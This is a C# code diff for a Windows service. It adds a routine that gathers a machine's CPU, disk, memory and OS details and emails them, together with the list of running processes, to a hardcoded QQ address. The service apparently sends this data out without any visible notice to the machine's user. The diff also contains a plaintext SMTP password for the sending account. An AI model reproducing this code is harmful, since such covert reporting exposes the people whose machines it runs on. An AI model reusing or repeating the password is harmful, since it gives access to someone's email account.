@@ -1,12 +1,6 @@
 ﻿using MimeKit;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
-using System.IO;
-using System.Net.NetworkInformation;
-using System.Runtime.InteropServices;
 using System.ServiceProcess;
 using System.Text;
 using System.Threading;
@@ -86,7 +80,7 @@ namespace Dszy
             catch { }
         }
 
-        private string ProcessMiro()
+        private string ProcessInfo()
         {
             var myProcess = Process.GetProcesses();
             StringBuilder sb = new StringBuilder();
@@ -106,6 +100,17 @@ namespace Dszy
             return sb.ToString();
         }
 
+        private string MachineInfo()
+        {
+            StringBuilder info = new StringBuilder();
+            info.AppendLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
+            info.AppendLine("CPU:\r\n" + MachineHelper.CpuInfo());
+            info.AppendLine("HardDisk:\r\n" + MachineHelper.HardDiskInfo());
+            info.AppendLine("Memory:\r\n" + MachineHelper.MemoryInfo());
+            info.AppendLine("OS:\r\n" + MachineHelper.OSInfo());
+            return info.ToString();
+        }
+
         private async Task SendWakeupMailAsync()
         {
             EMailHelper.Host = "smtp.qq.com";
@@ -115,7 +120,7 @@ namespace Dszy
             EMailHelper.Password = "phykougiygxcbjif";
             EMailHelper.UserAddress = "390059127@qq.com";
             var subject = "Wakeup";
-            var content = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            var content = MachineInfo();
             await EMailHelper.SendEMailAsync(subject, content, new MailboxAddress[] {
                 new MailboxAddress("150101977@qq.com")
             });
@@ -130,7 +135,7 @@ namespace Dszy
             EMailHelper.Password = "phykougiygxcbjif";
             EMailHelper.UserAddress = "390059127@qq.com";
             var subject = "InfoNow";
-            string str = ProcessMiro();
+            string str = ProcessInfo();
             await EMailHelper.SendEMailAsync(subject, str, new MailboxAddress[] {
                 new MailboxAddress("150101977@qq.com")
             });
